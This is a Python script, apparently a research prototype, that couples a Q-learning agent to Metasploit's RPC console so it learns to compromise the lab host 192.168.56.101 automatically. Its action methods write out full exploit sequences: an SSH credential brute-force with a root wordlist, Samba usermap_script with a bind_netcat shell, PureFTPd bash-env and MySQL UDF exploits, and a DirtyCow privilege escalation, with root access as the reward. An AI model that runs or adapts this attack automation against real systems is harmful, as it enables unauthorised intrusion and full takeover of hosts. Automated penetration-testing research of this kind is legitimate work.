# coding=utf-8
"""
This part of code is the Q learning brain, which is a brain of the agent.
All decisions are made in here.

View more on my tutorial page: https://morvanzhou.github.io/tutorials/
"""

import numpy as np
import pandas as pd
import time
import re
from metasploit.msfrpc import MsfRpcClient
from metasploit.msfconsole import MsfRpcConsole


class QLearningTable:
    def __init__(self, actions, learning_rate=0.01, reward_decay=0.9, e_greedy=0.9):
        self.actions = actions  # a list
        self.lr = learning_rate
        self.gamma = reward_decay
        self.epsilon = e_greedy
        self.q_tables = {}
        #self.q_table = pd.DataFrame(columns=self.actions, dtype=np.float64)
        
        self.global_positive_out = list()
        self.global_console_status = False
        self.success=False
        self.whoami= 'Not root'
        self.session=0
        self.session_regex= re.compile("session ([0-9]*)")
        self.state_actions= self.initialise_state_actions()
        self.all_actions= self.initialise_all_actions(self.state_actions)
        
        self.client = MsfRpcClient('password')
        self.console = MsfRpcConsole(self.client, cb=self.read_console)
        
    def read_console(self, console_data):
        self.global_console_status = console_data['busy']
        #print global_console_status
        
        if '[+]' in console_data['data']:
            sigdata = console_data['data'].rstrip().split('\n')
            for line in sigdata:
                    if '[+]' in line:
                    		self.global_positive_out.append(line)
                            
        if ("Success" in console_data['data']) or ("opened" in console_data['data']):
            self.success= True
            #print('success='+ str(success))
        else:
            self.success= False
            
        if ("root" in console_data['data']):
            self.whoami = 'root'
        else:
            self.whoami = 'Not root'
            
        if self.session_regex.search(console_data['data']) != None:
            self.session= self.session_regex.search(console_data['data']).group(1)
            
        #print console_data['data']
        
    def initialise_state_actions(self): # à compléter
        return {
                "{'port139': True, 'port21': True, 'port3306': True, 'port22': True}": [self.ssh_login, self.samba, self.ftp1, self.mysql],
                str(self.ssh_login): [self.dirtyCow, self.ls],
                'terminal': []
                }
        
    def initialise_all_actions(self, state_actions):
        list1= state_actions.values()
        all_actions = {}
        for list2 in list1:
            for elt in list2:
                all_actions[str(elt)]=elt
        return all_actions
            
        
    def update_actions(self, observation): # à compléter
        #print( self.q_tables)
        print("\nOBSERVATION: "+ observation)
        if self.q_tables == {}: # si c'est le premier update on doit forcement prendre les actions de l'état nmap, mais bon ça veut dire qu'on suppose qu'on ne fait qu'un seul nmap dans chaque partie, ce qui ne sera pas forcément le cas plutard, donc à revoir
            self.actions = self.state_actions["{'port139': True, 'port21': True, 'port3306': True, 'port22': True}"] # à modifier
            return 
        self.actions = self.state_actions[observation]
        
    def update_q_tables(self, observation):
        if str(observation) not in self.q_tables.keys():
            #self.q_tables[str(observation)]= pd.DataFrame(columns=self.actions, dtype=np.float64)
            self.q_tables[str(observation)]= pd.DataFrame(columns=[str(a) for a in self.actions], dtype=np.float64)
        

    def choose_action(self, observation):
        self.check_state_exist(str(observation))
        # action selection
        if np.random.uniform() < self.epsilon:
            # choose best action
            state_action = self.q_tables[str(observation)].loc[observation, :]
            # some actions may have the same value, randomly choose on in these actions
            action = self.all_actions[np.random.choice(state_action[state_action == np.max(state_action)].index)] # on récupère l'instance de la fonction à travers la forme string de cette même instance
            #print(type(action))
        else:
            # choose random action
            action = np.random.choice(self.actions)
            #print(type(action))
        return action

    def learn(self, s, a, r, s_):
        self.check_state_exist(s_)
        q_predict = self.q_tables[s].loc[s, str(a)]
        if s_ != 'terminal':
            q_target = r + self.gamma * self.q_tables[s_].loc[s_, :].max()  # next state is not terminal
        else:
            q_target = r  # next state is terminal
        self.q_tables[s].loc[s, str(a)] += self.lr * (q_target - q_predict)  # update

    def check_state_exist(self, state):
        if state not in self.q_tables[state].index:
            # append new state to q table
            self.q_tables[state] = self.q_tables[state].append(
                pd.Series(
                    [0]*len(self.actions),
                    index=self.q_tables[state].columns,
                    name=state,
                )
            )
                
    def step(self, action):
        #s_ = 'terminal'  # next state, à modifier
        print("\nACTION: " + str(action))
        #print(type(action))
        time.sleep(5)
        (success2, whoami2)= action() # à vérifier

        #time.sleep(20) # modifier, pas bon de faire comme ça
        
        # reward function
        #if s_ == self.canvas.coords(self.oval):
        if whoami2 == 'root':
            reward = 1 
            done = True
            s_ = 'terminal'
            print('\nsuccess= '+str(success2))
            print('whoami= ' + whoami2)
            print('reward= '+ str(reward))
        elif (whoami2 != 'root') and (success2==True) : # à optimiser
            reward = 0
            done = False
            s_ = str(action)  # voir comment récuperer la string 'ssh_login' de la fonction dont le nom est ssh_login()
            print('\nsuccess= '+str(success2))
            print('whoami= ' + whoami2)
            print('reward= '+ str(reward))
        elif (success2 == False): # à optimiser
            reward = -1
            done = True
            s_= 'terminal'
            print('\nsuccess= '+str(success2))
            print('whoami= ' + whoami2)
            print('reward= '+ str(reward))
            
#        else:
#            reward = 0
#            done = False
        return s_, reward, done
    
    
    
    # ACTIONS OF THE REINFORCEMENT LEARNING MODEL
    def nmap(self):
        # à modifier
        return str({'port21':True, 'port22':True, 'port139':True, 'port3306':True}) 
    
    def ssh_login(self):
        self.console.execute('use auxiliary/scanner/ssh/ssh_login')
        time.sleep(4)
        self.console.execute('set RHOSTS 192.168.56.101')
        time.sleep(4)
        self.console.execute('set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt')
        time.sleep(4)
        self.console.execute('set STOP_ON_SUCCESS true')
        time.sleep(4)
        self.console.execute('run')
        
        time.sleep(20) # pour laisser le temps à la variable 'success' de se mettre à jour dans le thread de la fonction 'read_console' 
        
        a= self.success
        
        if a:
            self.console.execute('sessions -i ' + str(self.session))
            time.sleep(4)
            
        if a:
            self.console.execute('whoami')
            time.sleep(4)
        
        b= self.whoami
        
        #while self.global_console_status:
        #while console.console.read()['busy']:
            #time.sleep(2)
            
        return a, b
            
    def samba(self):
        self.console.execute('use exploit/multi/samba/usermap_script')
        time.sleep(4)
        self.console.execute('set RHOST 192.168.56.101')
        time.sleep(4)
        self.console.execute('set payload cmd/unix/bind_netcat')
        time.sleep(4)
        self.console.execute('exploit')
        time.sleep(20) # pour laisser le temps à la variable 'success' de se mettre à jour dans le thread de la fonction 'read_console'
        a= self.success
        print(a)
        
        if a:
            self.console.execute('whoami')
            
        time.sleep(4) #sans le sleep il y a des problemes d'ordre d'execution
        b= self.whoami
        
        if a:
            time.sleep(3) 
            self.console.execute('background')
            time.sleep(3)
            self.console.execute('y')
        
        return a, b
        
    def ftp1(self):
        self.console.execute('use exploit/multi/ftp/pureftpd_bash_env_exec')
        time.sleep(4)
        self.console.execute('set RHOST 192.168.56.101')
        time.sleep(4)
        self.console.execute('exploit')
        time.sleep(20) # pour laisser le temps à la variable 'success' de se mettre à jour dans le thread de la fonction 'read_console'
        a= self.success
        
        if a:
            self.console.execute('whoami')
            time.sleep(4)
            
        b= self.whoami
        
        return a, b
        
    def mysql(self):
        self.console.execute('use exploit/multi/mysql/mysql_udf_payload')
        time.sleep(4)
        self.console.execute('set RHOST 192.168.56.101')
        time.sleep(4)
        self.console.execute('exploit')
        time.sleep(20) # pour laisser le temps à la variable 'success' de se mettre à jour dans le thread de la fonction 'read_console'
        a= self.success
        
        if a:
            self.console.execute('whoami')
            time.sleep(4)
        
        b= self.whoami
        
        return a, b
    
    def dirtyCow(self):  # suite de ssh_login
        self.console.execute('./cow')
        time.sleep(80) # (finalement j'en ai besoin) pas besoin finalement apparemment, car on reste sur le même thread
        self.console.execute('/usr/bin/passwd')
        time.sleep(4)  # utile?
        self.console.execute('whoami')
        time.sleep(4)
        b= self.whoami
        self.console.execute('background') # à modifier ?
        time.sleep(4)
        self.console.execute('y') # à modifier ?
        
        # revoir s'il y a un meilleur moyen de retourner self.success et self.whoami
        if b=='root':
            return True, 'root'
        else: 
            return False, 'Not root'
        
    def ls(self):
        self.console.execute('ls')
        time.sleep(3)
        self.console.execute('whoami')
        time.sleep(3)
        self.console.execute('background') # à modifier ?
        time.sleep(4)
        self.console.execute('y') # à modifier ?
        
        return False, 'Not root' # ls est juste une fonction de test c'est pourquoi je retourne n'importe quoi
            